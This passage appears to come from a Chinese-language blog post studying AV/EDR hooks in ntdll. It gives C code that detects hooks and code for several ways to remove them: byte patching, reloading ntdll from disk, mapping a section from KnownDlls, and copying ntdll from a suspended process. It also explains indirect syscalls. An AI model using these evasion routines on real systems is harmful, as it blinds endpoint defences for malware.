alt=\"image-20260201132845746\"></p>\n<p>debug看看VirtualAlloc的详细情况，首先在kernel32.dll中jmp进入kernelbase</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131525229.png\" alt=\"image-20260201131525229\"></p>\n<p>kernelbase.dll中调用ZwAllocateVirtualMemory</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131628295.png\" alt=\"image-20260201131628295\"></p>\n<p>在ntdll.dll中看到ZwAllocateVirtualMemory</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131938311.png\" alt=\"image-20260201131938311\"></p>\n<p>然后与添加白名单后进行比对，发现ZwAllocateVirtualMemory没有任何变化，也就意味着该函数没有被hook</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133717218.png\" alt=\"image-20260201133717218\"></p>\n<p>在ntdll中挑选其他函数进行对比能明显的发现被hook的函数在进入系统调用之前被替换为 <strong>jmp</strong> 指令，跳转到AV/EDR检测</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133051740.png\" alt=\"image-20260201133051740\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133846335.png\" alt=\"image-20260201133846335\"></p>\n<p>针对hook的检测有如下常见策略：</p>\n<ul>\n<li>函数开头字节比较：通过对比，被hook的函数开头是 <code>E9 或 E8</code> 干净的函数为 <code>4C 8B D1 B8</code> ，那么以函数是否存在E9/E8作为检测点</li>\n<li>完整性校验：函数所在页面计算哈希或签名，检测是否被改写</li>\n<li>内存与映像比较：比较内存中的API函数与其磁盘版本的API函数字节是否一致</li>\n</ul>\n<p><a href=\"https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions\">https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions</a></p>\n<p>比较所有导出函数开头字节</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void enumFunctionPatch() &#123;</span><br><span class=\"line\">\tPDWORD functionAddress &#x3D; (PDWORD)0;</span><br><span class=\"line\"></span><br><span class=\"line\">    HMODULE libraryBase &#x3D; GetModuleHandleW(L&quot;ntdll&quot;);</span><br><span class=\"line\">    PIMAGE_DOS_HEADER dosHeader &#x3D; (PIMAGE_DOS_HEADER)libraryBase;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS imageNTHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Locate export address table</span><br><span class=\"line\">\tDWORD_PTR exportDirectoryRVA &#x3D; imageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY imageExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Offsets to list of exported functions and their names</span><br><span class=\"line\">\tPDWORD addresOfFunctionsRVA &#x3D; (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfFunctions);</span><br><span class=\"line\">\tPDWORD addressOfNamesRVA &#x3D; (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNames);</span><br><span class=\"line\">\tPWORD addressOfNameOrdinalsRVA &#x3D; (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Iterate through exported functions of ntdll</span><br><span class=\"line\">\tfor (DWORD i &#x3D; 0; i &lt; imageExportDirectory-&gt;NumberOfNames; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F; Resolve exported function name</span><br><span class=\"line\">\t\tDWORD functionNameRVA &#x3D; addressOfNamesRVA[i];</span><br><span class=\"line\">\t\tDWORD_PTR functionNameVA &#x3D; (DWORD_PTR)libraryBase + functionNameRVA;</span><br><span class=\"line\">\t\tchar* functionName &#x3D; (char*)functionNameVA;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#x2F;&#x2F; Resolve exported function address</span><br><span class=\"line\">\t\tDWORD_PTR functionAddressRVA &#x3D; 0;</span><br><span class=\"line\">\t\tfunctionAddressRVA &#x3D; addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];</span><br><span class=\"line\">\t\tfunctionAddress &#x3D; (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#x2F;&#x2F; Syscall stubs start with these bytes</span><br><span class=\"line\">\t\tunsigned char syscallPrologue[4] &#x3D; &#123; 0x4c, 0x8b, 0xd1, 0xb8 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#x2F;&#x2F; Only interested in Nt|Zw functions</span><br><span class=\"line\">\t\tif (strncmp(functionName, (char*)&quot;Nt&quot;, 2) &#x3D;&#x3D; 0 || strncmp(functionName, (char*)&quot;Zw&quot;, 2) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; Check if the first 4 instructions of the exported function are the same as the sycall&#39;s prologue</span><br><span class=\"line\">\t\t\tif (memcmp(functionAddress, syscallPrologue, 4) !&#x3D; 0) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tif (*((unsigned char*)functionAddress) &#x3D;&#x3D; 0xE9) &#x2F;&#x2F; first byte is a jmp instruction, where does it jump to?</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t&#x2F;&#x2F; jmpTargetAddr &#x3D; funcAddr + 5(length of jmp) + offset()</span><br><span class=\"line\">\t\t\t\t\tDWORD jumpTargetRelative &#x3D; *((PDWORD)((char*)functionAddress + 1));</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot;Relative : %p &quot;, jumpTargetRelative);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tPDWORD jumpTarget &#x3D; functionAddress + 5 + jumpTargetRelative;</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot; Jump target address: %p &quot;, jumpTarget);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tchar moduleNameBuffer[512];</span><br><span class=\"line\">\t\t\t\t\tGetMappedFileNameA(GetCurrentProcess(), jumpTarget, moduleNameBuffer, sizeof(moduleNameBuffer));</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot;Hooked: %s : %p into module %s\\n&quot;, functionName, functionAddress, moduleNameBuffer);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\telse</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot;Potentially hooked: %s : %p\\n&quot;, functionName, functionAddress);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>内存与映像比较</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void isFunctionPatch(LPCWSTR dllname,LPCSTR funcname) &#123;</span><br><span class=\"line\">    HMODULE memModule &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class=\"line\">    printf(&quot;[*] ntdll.dll in mem addr: 0x%p \\n&quot;, memModule);</span><br><span class=\"line\"></span><br><span class=\"line\">    FARPROC memProc &#x3D; GetProcAddress(memModule, funcname);</span><br><span class=\"line\">    printf(&quot;[*] %s in mem addr: 0x%p \\n\\n&quot;, funcname, memProc);</span><br><span class=\"line\"></span><br><span class=\"line\">    HMODULE diskModule &#x3D; LoadLibraryExW(dllname,nullptr, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class=\"line\">    if (!diskModule) &#123;</span><br><span class=\"line\">        printf(&quot;[-] LoadLib Err&quot;);</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(&quot;[*] %ls in disk addr: 0x%p \\n&quot;, dllname,diskModule);</span><br><span class=\"line\"></span><br><span class=\"line\">    FARPROC diskProc &#x3D; GetProcAddress(diskModule, funcname);</span><br><span class=\"line\">    if (!diskProc) &#123;</span><br><span class=\"line\">        printf(&quot;[-] Get %s Err \\n&quot;, funcname);</span><br><span class=\"line\">        FreeLibrary(diskModule);</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(&quot;[*] %s in disk addr: 0x%p \\n\\n&quot;, funcname,diskProc);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    BYTE membyte[4];</span><br><span class=\"line\">    memcpy(membyte, memProc, sizeof(membyte));</span><br><span class=\"line\">    printf(&quot;[*] %s in mem byte: &quot;, funcname);</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof(membyte); i++) &#123;</span><br><span class=\"line\">        printf(&quot;%02X &quot;, membyte[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(&quot;\\n&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    BYTE diskbyte[4];</span><br><span class=\"line\">    memcpy(diskbyte, diskProc, sizeof(diskbyte));</span><br><span class=\"line\">    printf(&quot;[*] %s in disk byte: &quot;,funcname);</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof(diskbyte); i++) &#123;</span><br><span class=\"line\">        printf(&quot;%02X &quot;, diskbyte[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(&quot;\\n&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    bool patched &#x3D; memcmp(diskbyte, membyte, sizeof(membyte)) !&#x3D; 0;</span><br><span class=\"line\">    FreeLibrary(diskModule);</span><br><span class=\"line\">    return;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">isFunctionPatch(L&quot;C:\\\\Users\\\\admin\\\\Desktop\\\\ntdll.dll&quot;,&quot;ZwOpenProcess&quot;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"UnHook-手段\"><a href=\"#UnHook-手段\" class=\"headerlink\" title=\"UnHook 手段\"></a>UnHook 手段</h1><p>unhook手段是为了获取到干净的dll、函数。可以使用 寻找未被hook的函数、patch函数、重映射、syscall、自定义跳转、IAT、EAT等手段，在获取到干净的dll后，<strong>可以覆盖原dll，或者通过解析导出表计算地址使用干净dll中的干净函数。</strong></p>\n<p>计算导出表并使用干净函数，下文不再记录该方式：<a href=\"https://idiotc4t.com/defense-evasion/load-ntdll-too\">https://idiotc4t.com/defense-evasion/load-ntdll-too</a></p>\n<h2 id=\"修补函数\"><a href=\"#修补函数\" class=\"headerlink\" title=\"修补函数\"></a>修补函数</h2><p>通过 WriteProcessMemory 等函数将原来的指令字节写到被hook的位置，从而覆盖jmp指令，恢复原始状态，以ZwOpenProcess为例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void FixFunction(LPCSTR dllname, LPCSTR funcname, LPCSTR fixbyte) &#123;</span><br><span class=\"line\">\tHMODULE memModule &#x3D; GetModuleHandleA(dllname);</span><br><span class=\"line\">\tFARPROC memProc &#x3D; GetProcAddress(memModule, funcname);</span><br><span class=\"line\">\tprintf(&quot;[+] %s address is : %p\\n&quot;, funcname, memProc);</span><br><span class=\"line\">\tif (WriteProcessMemory(GetCurrentProcess(), memProc, fixbyte, sizeof(fixbyte), NULL)) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;[+] %s unhooking done!\\n&quot;, funcname);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># FixFunction(&quot;ntdll&quot;,&quot;ZwOpenProcess&quot;,&quot;\\x4C\\x8B\\xD1\\xB8\\x26\\x00\\x00\\x00&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>成功修补函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260205012448835.png\" alt=\"image-20260205012448835\"></p>\n<h2 id=\"磁盘重载\"><a href=\"#磁盘重载\" class=\"headerlink\" title=\"磁盘重载\"></a>磁盘重载</h2><p>通过读取本地磁盘上dll并使用函数组合将文件映射为 <strong>memory mapped file（Mapped File Section）</strong>从而引入第二个被载入到内存中的干净dll，映射结果Type为 MEM_MAPPED，这与Image Section的映射是有区别的。</p>\n<p>以下路线可以实现磁盘重载：</p>\n<ul>\n<li>CreateFile + CreateFileMapping + MapViewOfFile</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HANDLE hntFile &#x3D; CreateFileA(&quot;C:\\\\Windows\\\\system32\\\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">HANDLE hntMapping &#x3D; CreateFileMappingA(hntFile, NULL, PAGE_READONLY| SEC_IMAGE,0,0,NULL);</span><br><span class=\"line\">LPVOID DiskNtdllBase &#x3D; MapViewOfFile(hntMapping, FILE_MAP_READ, 0, 0, 0);</span><br><span class=\"line\">\t...</span><br><span class=\"line\">for (WORD i &#x3D; 0; i &lt; memNtheader-&gt;FileHeader.NumberOfSections; i++, memSectionHeader++) &#123;</span><br><span class=\"line\">\tif (!strcmp((char*)memSectionHeader-&gt;Name, (char*)&quot;.text&quot;)) &#123;</span><br><span class=\"line\">\t\tDWORD oldProtection &#x3D; 0;</span><br><span class=\"line\">\t\tbool isProtected &#x3D; VirtualProtect((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class=\"line\">\t\tif (!isProtected) &#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;[-] Failed in VirtualProtect1 (%u)\\n&quot;, GetLastError());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tmemcpy((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), (LPVOID)((BYTE*)DiskNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize);</span><br><span class=\"line\">\t\tisProtected &#x3D; VirtualProtect((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class=\"line\">\t\tif (!isProtected) &#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;[-] Failed in VirtualProtect2 (%u)\\n&quot;, GetLastError());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tprintf(&quot;[*] rewrite .text success&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"节映射\"><a href=\"#节映射\" class=\"headerlink\" title=\"节映射\"></a>节映射</h2><p>这里先给出与磁盘重载的区别：</p>\n<blockquote>\n<p>节映射（Image Mapping）是指通过 SEC_IMAGE 创建的 Image Section 被映射到进程地址空间，内核会对 PE 进行解析、重排与对齐，形成 完整的、可执行的映像布局（MEM_IMAGE），属于 Windows 认可的 完整映像。</p>\n</blockquote>\n<blockquote>\n<p>磁盘重载（File Mapping）是指 磁盘上的文件仅作为普通文件，通过 Section object 进行文件映射，映射结果只是原始磁盘文件数据在内存中的线性视图（MEM_MAPPED），内核不解析 PE，也不赋予映像语义。</p>\n</blockquote>\n<p>通过节映射将dll重新展开映射到内存中，获取到干净的dll</p>\n<p>以下有两条路线可以实现节映射：</p>\n<ul>\n<li>NtOpenSection + NtMapViewOfSection 通过 <strong>\\KnownDlls\\ntdll.dll（系统预先创建好的 Section）</strong> 直接将节对象映射，映射结果Type为 MEM_IMAGE</li>\n<li>CreateFile/NtOpenFile + NtCreateSection + NtMapViewOfSection 通过文件句柄打开磁盘文件并创建Image Section，将节对象映射，映射结果Type为 MEM_IMAGE</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;psapi.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;&#x3D; 0)</span><br><span class=\"line\">#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )</span><br><span class=\"line\"></span><br><span class=\"line\">#define OBJ_CASE_INSENSITIVE 0x40</span><br><span class=\"line\">#define InitializeObjectAttributes( p, n, a, r, s ) &#123;   \\</span><br><span class=\"line\">    (p)-&gt;Length &#x3D; sizeof( OBJECT_ATTRIBUTES );          \\</span><br><span class=\"line\">    (p)-&gt;RootDirectory &#x3D; r;                             \\</span><br><span class=\"line\">    (p)-&gt;Attributes &#x3D; a;                                \\</span><br><span class=\"line\">    (p)-&gt;ObjectName &#x3D; n;                                \\</span><br><span class=\"line\">    (p)-&gt;SecurityDescriptor &#x3D; s;                        \\</span><br><span class=\"line\">    (p)-&gt;SecurityQualityOfService &#x3D; NULL;               \\</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _UNICODE_STRING &#123;</span><br><span class=\"line\">\tUSHORT Length;</span><br><span class=\"line\">\tUSHORT MaximumLength;</span><br><span class=\"line\">\tPWSTR  Buffer;</span><br><span class=\"line\">&#125; UNICODE_STRING, * RX_UNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef VOID(NTAPI* MyRtlInitUnicodeString)(RX_UNICODE_STRING, PCWSTR);</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _OBJECT_ATTRIBUTES &#123;</span><br><span class=\"line\">\tULONG Length;</span><br><span class=\"line\">\tHANDLE RootDirectory;</span><br><span class=\"line\">\tRX_UNICODE_STRING ObjectName;</span><br><span class=\"line\">\tULONG Attributes;</span><br><span class=\"line\">\tPVOID SecurityDescriptor;        &#x2F;&#x2F; Points to type SECURITY_DESCRIPTOR</span><br><span class=\"line\">\tPVOID SecurityQualityOfService;  &#x2F;&#x2F; Points to type SECURITY_QUALITY_OF_SERVICE</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; OBJECT_ATTRIBUTES;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IO_STATUS_BLOCK &#123;</span><br><span class=\"line\">\tunion &#123;</span><br><span class=\"line\">\t\tNTSTATUS Status;</span><br><span class=\"line\">\t\tPVOID Pointer;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tULONG_PTR Information;</span><br><span class=\"line\">&#125; IO_STATUS_BLOCK, * RX_IO_STATUS_BLOCK;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef NTSTATUS(NTAPI* MyNtOpenSection)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);</span><br><span class=\"line\">typedef NTSTATUS(NTAPI* MyNtOpenFile)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, RX_IO_STATUS_BLOCK, ULONG, ULONG);</span><br><span class=\"line\">typedef NTSTATUS(NTAPI* MyNtCreateSection)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);</span><br><span class=\"line\">typedef NTSTATUS(NTAPI* MyNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void SectionMapping1() &#123;</span><br><span class=\"line\">    UNICODE_STRING ObjectPath;</span><br><span class=\"line\">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class=\"line\">    HANDLE hSection;</span><br><span class=\"line\">    PVOID SectionNtdllBase &#x3D; NULL;</span><br><span class=\"line\">    ULONG_PTR ViewSize &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">    HMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class=\"line\">    MyRtlInitUnicodeString RtlInitUnicodeString &#x3D; (MyRtlInitUnicodeString)GetProcAddress(memNtdllBase, &quot;RtlInitUnicodeString&quot;);</span><br><span class=\"line\">    MyNtOpenSection pNtOpenSection &#x3D; (MyNtOpenSection)(GetProcAddress(memNtdllBase, &quot;NtOpenSection&quot;));</span><br><span class=\"line\">    MyNtMapViewOfSection pNtMapViewOfSection &#x3D; (MyNtMapViewOfSection)(GetProcAddress(memNtdllBase, &quot;NtMapViewOfSection&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    RtlInitUnicodeString(&amp;ObjectPath, L&quot;\\\\KnownDlls\\\\ntdll.dll&quot;);</span><br><span class=\"line\">    InitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, NULL, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    NTSTATUS status1 &#x3D; pNtOpenSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &amp;ObjectAttributes);</span><br><span class=\"line\">    if (!NT_SUCCESS(status1)) &#123;printf(&quot;[!] Failed in NtOpenSection (%u)\\n&quot;, GetLastError());return;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    NTSTATUS status2 &#x3D; pNtMapViewOfSection(hSection, NtCurrentProcess(), &amp;SectionNtdllBase, 0, 0, NULL, &amp;ViewSize, 1, 0, PAGE_READONLY);</span><br><span class=\"line\">    if (!NT_SUCCESS(status2)) &#123;printf(&quot;[!] Failed in NtMapViewOfSection (%u)\\n&quot;, GetLastError());return;&#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void SectionMapping2() &#123;</span><br><span class=\"line\">\tUNICODE_STRING ObjectPath;</span><br><span class=\"line\">\tOBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class=\"line\">\tIO_STATUS_BLOCK IoStatusBlock;</span><br><span class=\"line\">\tHANDLE hFile;</span><br><span class=\"line\">\tHANDLE hSection;</span><br><span class=\"line\">\tPVOID SectionNtdllBase &#x3D; NULL;</span><br><span class=\"line\">\tULONG_PTR ViewSize &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class=\"line\">\tMyRtlInitUnicodeString RtlInitUnicodeString &#x3D; (MyRtlInitUnicodeString)GetProcAddress(memNtdllBase, &quot;RtlInitUnicodeString&quot;);</span><br><span class=\"line\">\tMyNtOpenFile pNtOpenFile &#x3D; (MyNtOpenFile)(GetProcAddress(memNtdllBase, &quot;NtOpenFile&quot;));</span><br><span class=\"line\">\tMyNtCreateSection pNtCreateSection &#x3D; (MyNtCreateSection)(GetProcAddress(memNtdllBase, &quot;NtCreateSection&quot;));</span><br><span class=\"line\">\tMyNtMapViewOfSection pNtMapViewOfSection &#x3D; (MyNtMapViewOfSection)(GetProcAddress(memNtdllBase, &quot;NtMapViewOfSection&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\tRtlInitUnicodeString(&amp;ObjectPath, L&quot;\\\\??\\\\C:\\\\Windows\\\\System32\\\\ntdll.dll&quot;);</span><br><span class=\"line\">\tInitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, NULL, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\tNTSTATUS status1 &#x3D; pNtOpenFile(&amp;hFile, FILE_READ_DATA | GENERIC_READ, &amp;ObjectAttributes, &amp;IoStatusBlock, FILE_SHARE_READ, NULL);</span><br><span class=\"line\">\tif (!NT_SUCCESS(status1)) &#123; printf(&quot;[!] Failed in NtOpenFile (%u)\\n&quot;, GetLastError());return; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tNTSTATUS status2 &#x3D; pNtCreateSection(&amp;hSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);</span><br><span class=\"line\">\tif (!NT_SUCCESS(status2)) &#123; printf(&quot;[!] Failed in NtCreateSection (%u)\\n&quot;, GetLastError());return; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tNTSTATUS status3 &#x3D; pNtMapViewOfSection(hSection, NtCurrentProcess(), &amp;SectionNtdllBase, 0, 0, NULL, &amp;ViewSize, 1, 0, PAGE_READONLY);</span><br><span class=\"line\">\tif (!NT_SUCCESS(status3)) &#123; printf(&quot;[!] Failed in NtMapViewOfSection (%u)\\n&quot;, GetLastError());return; &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260208045313000.png\" alt=\"image-20260208045313000\"></p>\n<h2 id=\"挂起进程\"><a href=\"#挂起进程\" class=\"headerlink\" title=\"挂起进程\"></a>挂起进程</h2><p>创建一个挂起的进程时，只会加载一个干净的ntdll.dll</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void UnhookSuspend() &#123;</span><br><span class=\"line\">    STARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">    PROCESS_INFORMATION pi &#x3D; &#123;0&#125;;</span><br><span class=\"line\">    CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED|CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);</span><br><span class=\"line\">    printf(&quot;[*] PID : %d\\n&quot;, pi.dwProcessId);</span><br><span class=\"line\"></span><br><span class=\"line\">    HMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class=\"line\">    PIMAGE_DOS_HEADER memDosHeader &#x3D; (PIMAGE_DOS_HEADER)memNtdllBase;</span><br><span class=\"line\">    PIMAGE_NT_HEADERS memNtHeader &#x3D; (PIMAGE_NT_HEADERS)((BYTE*)memNtdllBase + memDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">    IMAGE_OPTIONAL_HEADER memOpHeader &#x3D; (IMAGE_OPTIONAL_HEADER)(memNtHeader-&gt;OptionalHeader);</span><br><span class=\"line\">    DWORD Ntsize &#x3D; memOpHeader.SizeOfImage;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID ProcessNtdllBase &#x3D; HeapAlloc(GetProcessHeap(), 0, Ntsize);</span><br><span class=\"line\">    SIZE_T dwRead;</span><br><span class=\"line\">    BOOL bSuccess &#x3D; ReadProcessMemory(pi.hProcess, (LPCVOID)memNtdllBase, ProcessNtdllBase, Ntsize, &amp;dwRead);</span><br><span class=\"line\">    if (!bSuccess) &#123;printf(&quot;[-] Failed in reading process ntdll (%u)\\n&quot;, GetLastError());return;&#125;</span><br><span class=\"line\">    TerminateProcess(pi.hProcess, 0);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在AV机器测试时虽然可以正常执行，但是最后总会触发错误</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260208162920145.png\" alt=\"image-20260208162920145\"></p>\n<h2 id=\"Syscall\"><a href=\"#Syscall\" class=\"headerlink\" title=\"Syscall\"></a>Syscall</h2><p>直接系统调用：绕过用户空间 API 钩子，直接调用内核服务</p>\n<p>间接系统调用：通过从合法的代码位置执行系统调用来维护自然的调用堆栈</p>\n<p>这一块内容扩展就有点太多了，后续结合项目进行学习</p>\n<p><a href=\"https://tttang.com/archive/1464/\">https://tttang.com/archive/1464/</a> 、<a href=\"https://forum.butian.net/share/4527%E3%80%81https://xz.aliyun.com/news/13127\">https://forum.butian.net/share/4527、https://xz.aliyun.com/news/13127</a></p>\n<h3 id=\"间接系统调用\"><a href=\"#间接系统调用\" class=\"headerlink\" title=\"间接系统调用\"></a>间接系统调用</h3><p>通过重新自定义一个新函数，在新函数中跳转到被hook函数的jmp指令后的位置，从而跳过jmp指令检测，同时还不用修改原函数，并且最终是ntdll发起的调用。这张图以LdrLoadDll函数为例，解释了该方法的原理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211001705602.png\" alt=\"image-20260211001705602\"></p>\n<p>简单解释下自定义函数的指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">48 89 5c 24 10 \t\t\t\t\tmov qword ptr [rsp+10h],rbx   &#x2F;&#x2F; 手动恢复因hook被覆盖的原字节</span><br><span class=\"line\">49 bb de ad be ef de ad be ef   movabs r11,0xefbeaddeefbeadde &#x2F;&#x2F; 保存要跳转到的地址</span><br><span class=\"line\">41 ff e3                \t\tjmp    r11 &#x2F;&#x2F; 跳转</span><br><span 